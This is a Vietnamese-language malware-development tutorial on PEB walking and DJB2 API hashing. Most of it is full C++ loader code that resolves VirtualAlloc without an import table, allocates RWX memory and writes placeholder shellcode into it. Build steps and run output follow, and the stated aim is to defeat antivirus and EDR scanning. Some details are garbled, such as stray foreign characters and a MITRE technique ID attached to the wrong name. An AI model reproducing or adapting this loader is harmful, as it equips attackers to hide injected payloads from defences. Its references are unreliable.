
---

# 📝 [PE 17] PEB Walk Injection (API Hashing & Dynamic Symbol Resolution)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**PEB Walk Injection** đại diện cho giải thuật phân giải ký hiệu động và ẩn giấu hành vi ở mức độ nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ tĩnh và động dựa trên cấu trúc siêu dữ liệu tiến trình (Subsystem Metadata & Import Table Evasion)**.

Mọi tệp tin nhị phân Portable Executable (PE) thông thường khi biên dịch đều để lộ các dấu vết hàm API hệ thống cần triệu hồi lọt lòng cấu trúc bảng tra cứu Import Address Table (IAT). Các giải pháp phòng thủ như Antivirus/EDR Engine chỉ cần rà quét bảng IAT hoặc các chữ ký chuỗi tĩnh để phân loại và nhận diện ý đồ can thiệp hệ thống của chương trình (Heuristic Signature Matching). Ngay cả khi Loader ứng dụng các con trỏ hàm tuyệt đối để ẩn giấu IAT, bản thân mã nguồn vẫn phải triệu hồi cặp bài trùng `GetModuleHandle` và `GetProcAddress` một cách lộ liễu, vô tình để lại các chuỗi ký tự plain-text nhạy cảm trên đĩa thô.

Dự án PE 13/17 hóa giải triệt để rào cản trinh sát này bằng kỹ nghệ **Duyệt cấu trúc bộ nhớ tự thân (Dynamic Symbol Resolution Taxonomy)**. Mã nguồn xuất xưởng của Loader **hoàn toàn trống rỗng bảng Import Table (Zero IAT)**, không import bất kỳ hàm API nhạy cảm nào từ `kernel32.dll` hay `ntdll.dll`. Khi được nạp lên RAM, tiến trình tự thân vận động dựa trên kiến trúc phần cứng x64 để tự l lần vết bản đồ bộ nhớ ảo, duyệt qua danh sách các thư viện đã được Hệ điều hành Map từ trước, thực hiện so khớp chuỗi bằng giải thuật mã hóa một chiều **API Hashing (DJB2)**, từ đó tự tính toán ra tọa độ thực thi tuyệt đối của các hàm chức năng (`VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`). Hành vi này bẻ gãy hoàn toàn các bộ quét Heuristic, đưa mức độ né tránh đạt trạng thái lý tưởng.

### 🎯 Mục tiêu nghiên cứu:

* **Triệt tiêu chỉ dấu Import Address Table**: Loại bỏ hoàn toàn các từ khóa API nhạy cảm khỏi bảng IAT nạp đĩa thô nhằm làm mù các bộ quét chữ ký tĩnh.
* **Làm chủ kỹ nghệ Thao túng Thanh ghi Phân đoạn**: Khai thác đặc tính kiến trúc phần cứng bộ vi xử lý x64 (`GS Segment Register`) để truy cập vào cấu trúc dữ liệu tối cao của tiến trình.
* **Ứng dụng giải thuật API Hashing**: Hiện thực hóa giải pháp mã hóa chuỗi ký tự hàm hệ thống bằng thuật toán DJB2, triệt tiêu khả năng dịch ngược hoặc bóc tách chuỗi thô trên RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Mọi tiến trình đang vận hành trong Windows Subsystem đều được hệ điều hành thiết lập một cấu trúc dữ liệu quản lý thông tin tổng quan tại không gian người dùng gọi là **PEB (Process Environment Block)**. Trên kiến trúc phần cứng x64, con trỏ quản lý PEB luôn tọa lạc cố định tại vị trí offset `0x60` của cấu trúc bản ghi TEB (Thread Environment Block), và TEB được ánh xạ trực tiếp vào thanh ghi phân đoạn **`GS`** của CPU.

Quy trình toán học giải phẫu cấu trúc metadata nội tại và bóc tách con trỏ hàm động diễn ra ngầm qua các phân hệ sau:

```
[Thanh ghi GS:[0x60]] ──> [Bóc tách cấu trúc PEB Object]
                               └──> [PEB_LDR_DATA -> InLoadOrderModuleList]
                                         └──> [Quét DllBase -> Giải phẫu thủ công Export Table]
                                                   └──> [DJB2 Hash Match -> Trích xuất API tuyệt đối]

```

1. **Truy cập danh bạ quản lý Mô-đun hệ thống**: Bằng cách triệu hồi các hàm nội tại của trình biên dịch (Compiler Intrinsics - cụ thể là hàm `__readgsqword`), Loader truy cập thẳng vào ô nhớ `GS:[0x60]` để bốc cấu trúc PEB từ xa. Tại không gian PEB, giải thuật tính toán tịnh tiến vị trí tịnh tiến offset `0x18` để tiếp cận con trỏ quản lý danh sách mô-đun nạp **`Ldr`** (`PPEB_LDR_DATA`). Cấu trúc này nắm giữ một đồ hình danh sách liên kết kép vòng tròn mang tên **`InLoadOrderModuleList`** – nơi nhân Windows ghi nhận mọi thư viện DLL đã được ánh xạ vào bộ nhớ ảo tiến trình theo thứ tự thời gian.
2. **Cô lập Module Target bằng cơ chế API Hashing**: Giải thuật thực hiện duyệt qua từng nút (Nodes) của danh sách liên kết kép, ép kiểu con trỏ bộ nhớ về cấu trúc dữ liệu bản ghi `LDR_DATA_TABLE_ENTRY`. Mỗi Node sẽ lưu trữ tên chuỗi định danh Wide-char của DLL (`BaseDllName`) cùng địa chỉ nạp sống **`DllBase`** của nó trên bộ nhớ ảo. Nhằm né tránh việc sử dụng chuỗi văn bản tĩnh, Loader băm tên của DLL ngay tại thời điểm duyệt bằng thuật toán DJB2 và so sánh trực tiếp với giá trị băm Hex đã tính toán sẵn từ trước, định vị chính xác vị trí của `kernel32.dll`.
3. **Tự giải phẫu cấu trúc Export Address Table (EAT)**: Khi đã cô lập thành công địa chỉ gốc `DllBase` của `kernel32.dll`, Loader tiến hành giải phẫu cấu trúc Portable Executable thô ngay trên RAM. Giải thuật ép kiểu ô nhớ này về bản ghi `PIMAGE_DOS_HEADER`, trỏ tới vị trí trường chỉ mục `e_lfanew` để tiếp cận cấu trúc NT Headers (`PIMAGE_NT_HEADERS64`). Loader chui sâu vào phân đoạn thư mục dữ liệu xuất bản hàm **Export Directory** (`IMAGE_DIRECTORY_ENTRY_EXPORT`). Tại đây, giải thuật duyệt thủ công mảng chứa tên hàm xuất bản (`AddressOfNames`), băm từng tên hàm lên bằng thuật toán DJB2 để so khớp cấu trúc logic, bốc trần địa chỉ tuyệt đối của các API nhạy cảm (`VirtualAlloc`, `WriteProcessMemory`) mà không cần nhờ cậy đến bất kỳ hàm liên kết động bọc ngoài nào của OS.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – loại bỏ hoàn toàn các chuỗi gán cứng thô sơ, thay thế 100% bằng giá trị băm Hex `constexpr` được tối ưu hóa ngay tại thời điểm biên dịch nhằm đạt độ phẳng sạch lý tưởng trên bộ nhớ RAM.

```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu nội bộ của Windows thu gọn để duyệt thủ công trên x64 Architecture
typedef struct _UNICODE_STRING_INTERNAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_INTERNAL;

typedef struct _PEB_LDR_DATA_INTERNAL {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA_INTERNAL, * PPEB_LDR_DATA_INTERNAL;

typedef struct _LDR_DATA_TABLE_ENTRY_INTERNAL {
    LIST_ENTRY InLoadOrderLinks;
    BYTE Reserved1[16];
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING_INTERNAL FullDllName;
    UNICODE_STRING_INTERNAL BaseDllName;
} LDR_DATA_TABLE_ENTRY_INTERNAL, * PLDR_DATA_TABLE_ENTRY_INTERNAL;

typedef struct _PEB_INTERNAL {
    BYTE Reserved1[4];
    PVOID Reserved2[1];
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA_INTERNAL Ldr;
} PEB_INTERNAL, * PPEB_INTERNAL;

// 1. Giải thuật băm chuỗi DJB2 kịch khung - Triệt tiêu hoàn toàn dấu vết chuỗi text tĩnh trong file thực thi
constexpr DWORD HashDJB2W(const wchar_t* str) {
    DWORD hash = 5381;
    while (wchar_t c = *str++) {
        if (c >= L'A' && c <= L'Z') c += 32; // Chuyển sang chữ thường để đồng bộ hóa kết quả băm
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

constexpr DWORD HashDJB2A(const char* str) {
    DWORD hash = 5381;
    while (char c = *str++) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// 2. Hàm tối cao PEB Walk: Tự bới RAM tìm Base Address của DLL bất kỳ thông qua thanh ghi GS
PVOID GetModuleBaseViaPEB(DWORD dllHash) {
    // Đọc con trỏ PEB trực tiếp từ thanh ghi phân đoạn GS tại offset 0x60 trên kiến trúc x64 Windows
    PPEB_INTERNAL pPeb = (PPEB_INTERNAL)__readgsqword(0x60);
    PPEB_LDR_DATA_INTERNAL pLdr = pPeb->Ldr;
    
    PLDR_DATA_TABLE_ENTRY_INTERNAL pModuleEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pLdr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY_INTERNAL pFirstEntry = pModuleEntry;

    do {
        if (pModuleEntry->BaseDllName.Buffer != NULL) {
            if (HashDJB2W(pModuleEntry->BaseDllName.Buffer) == dllHash) {
                return pModuleEntry->DllBase;
            }
        }
        pModuleEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pModuleEntry->InLoadOrderLinks.Flink;
    } while (pModuleEntry != pFirstEntry);

    return NULL;
}

// 3. Hàm giải phẫu Export Table: Duyệt thủ công cấu trúc cấu hình DLL để bốc tách địa chỉ API tuyệt đối
PVOID GetExportAddressViaEAT(PVOID dllBase, DWORD apiHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBase + dosHeader->e_lfanew);
    
    // Trỏ thẳng vào phân đoạn Export Data Directory của DLL x64
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + exportDir.VirtualAddress);
    
    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfNames);
    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfFunctions);
    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfNameOrdinals);

    // Duyệt thủ công mảng tên xuất bản hàm để so khớp mã băm DJB2
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        const char* szApiName = (const char*)((DWORD_PTR)dllBase + pdwNames[i]);
        if (HashDJB2A(szApiName) == apiHash) {
            WORD ordinal = pwOrdinals[i];
            DWORD functionRva = pdwFunctions[ordinal];
            return (PVOID)((DWORD_PTR)dllBase + functionRva); // Trả về tọa độ ô nhớ tuyệt đối sống trên RAM
        }
    }
    return NULL;
}

// Định nghĩa nguyên mẫu con trỏ hàm động phục vụ thực thi độc lập vị trí
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 17: PURE PEB WALK & API HASHING INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // Các giá trị băm Hex tính toán sẵn bằng DJB2 tại thời điểm compile, triệt tiêu hoàn toàn text-string
    constexpr DWORD HASH_KERNEL32 = HashDJB2W(L"kernel32.dll");
    constexpr DWORD HASH_VIRTUALALLOC = HashDJB2A("VirtualAlloc");

    std::cout << "[*] Dang tien hanh boi cau truc PEB de tim kiem Module Base..." << std::endl;
    
    // BƯỚC 1: Kích hoạt thuật toán PEB Walk để tìm kiếm địa chỉ Base Address của Kernel32
    PVOID kernel32Base = GetModuleBaseViaPEB(HASH_KERNEL32);
    if (!kernel32Base) {
        std::cerr << "[-] Khong the dinh vi Kernel32.dll qua PEB!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] San trung Kernel32 Base toa lac tai RAM: 0x" << std::hex << kernel32Base << std::endl;

    // BƯỚC 2: Tự giải phẫu cấu trúc Export Table nhằm bốc trần địa chỉ API VirtualAlloc
    PVOID pVirtualAllocAddress = GetExportAddressViaEAT(kernel32Base, HASH_VIRTUALALLOC);
    if (!pVirtualAllocAddress) {
        std::cerr << "[-] Khong the phan giai ham VirtualAlloc qua EAT!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tim thay dia chi ham tho VirtualAlloc: 0x" << std::hex << pVirtualAllocAddress << std::endl;

    // BƯỚC 3: Ép kiểu con trỏ hàm động và kích nổ phân hệ cấp phát bộ nhớ ảo
    fnVirtualAlloc DynamicVirtualAlloc = (fnVirtualAlloc)pVirtualAllocAddress;
    
    SIZE_T allocationSize = 4096;
    std::cout << "[*] Kich no cap phat bo nho bang con trỏ ham phan giai dong..." << std::endl;
    LPVOID allocatedBuffer = DynamicVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!allocatedBuffer) {
        std::cerr << "[-] Cap phat bo nho dong thong qua PEB tho that bai!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat trang nho RWX doc lap hoan toan thanh cong tai: 0x" << std::hex << allocatedBuffer << std::endl;

    // Mô phỏng ánh xạ cấu trúc mã máy thô độc lập vị trí (Shellcode) vào phân vùng vừa tìm được
    unsigned char shellcodeShell[] = { 0x90, 0x90, 0xCC, 0xC3 }; // Cấu trúc Opcode: NOP, NOP, INT3, RET
    RtlCopyMemory(allocatedBuffer, shellcodeShell, sizeof(shellcodeShell));
    std::cout << "[+] Da nap thu nghiem Payload vao khong gian ao an toan." << std::endl;

    std::cout << "\n[+] PEB Walk Symbol Resolution Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep cua so..." << std::endl;
    std::cin.get();

    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc tệp nhị phân bảo đảm triệt tiêu 100% các từ khóa chuỗi tĩnh, bắt buộc trình biên dịch thực hiện tối ưu hóa và liên kết tĩnh hệ thống:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc phần cứng **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
3. Đi tới phân hệ `Optimization` $\rightarrow$ Thiết lập bật tùy chọn **`Maximize Speed (/O2)`** nhằm bắt buộc trình biên dịch thực hiện tính toán toán học các giá trị băm chuỗi `constexpr` ngay tại giai đoạn compile, loại bỏ hoàn toàn các hàm băm chạy ở runtime.

> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
> 

4. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tệp tin thực thi nhị phân thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán duyệt sơ đồ PEB phần cứng:

```powershell
PS C:\Workspace\x64\Release> .\PE17_PebWalk_Injection.exe
====================================================
[*] PE 17: PURE PEB WALK & API Hashing INJECTION
====================================================
[*] Đang tiến hành bới cấu trúc PEB để tìm kiếm Module Base...
[+] Săn trúng Kernel32 Base tọa lạc tại RAM: 0x00007ffd31a10000
[+] Tìm thấy địa chỉ hàm thô VirtualAlloc: 0x00007ffd31a238a0
[*] Kích nổ cấp phát bộ nhớ bằng con trỏ hàm phân giải động...
[+] Cấp phát trang nhớ RWX độc lập hoàn toàn thành công tại: 0x00000219c0de0000
[+] Đã nạp thử nghiệm Payload vào không gian ảo an toàn.

[+] PEB Walk Symbol Resolution Completed Successfully!
[*] Nhấn phím Enter để dọn dẹp cửa sổ...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm phân giải ký hiệu qua PEB:**
> 

### 🎯 Phân tích hệ quả cấu trúc tệp tin (Binary Forensics):

* Thuật toán thực thi hoàn hảo kịch trần. Khi tiến hành bóc tách cấu trúc tệp tin sau xuất bản bằng các công cụ kết xuất cấu trúc tĩnh chuyên sâu (như `PEview`, `CFF Explorer` hoặc `Dependency Walker`), **bảng tra cứu Import Address Table (IAT) của file nhị phân hoàn toàn phẳng sạch, trống rỗng**, không chứa bất kỳ một từ khóa hay lệnh gọi liên kết động nhạy cảm nào hướng tới các hàm quản lý bộ nhớ của hệ thống.
* Ma trận bวน tìm kiếm diễn ra âm thầm thông qua thanh ghi phần cứng, bẻ gãy hoàn toàn hàng rào kiểm soát an ninh tĩnh của AV/EDR một cách ngoạn mục!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Technical Article**: *Process Environment Block (PEB) Structural Layout* - [https://learn.microsoft.com/en-us/windows/win32/api/winternals/ns-winternals-peb](https://www.google.com/search?q=https://learn.microsoft.com/en-us/windows/win32/api/winternals/ns-winternals-peb)
* **TEB & GS Segment Architecture**: *Operating System Internals - Thread Environment Block Alignment on Windows x64*.
* **Yong.H (Security Researcher)**: *Understanding DJB2 Hashing Algorithm for API Obfuscation and Dynamic Symbol Resolution*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Dynamic API Resolution (T1562)* & *Hide Artifacts: IAT Hide Evasion*.

---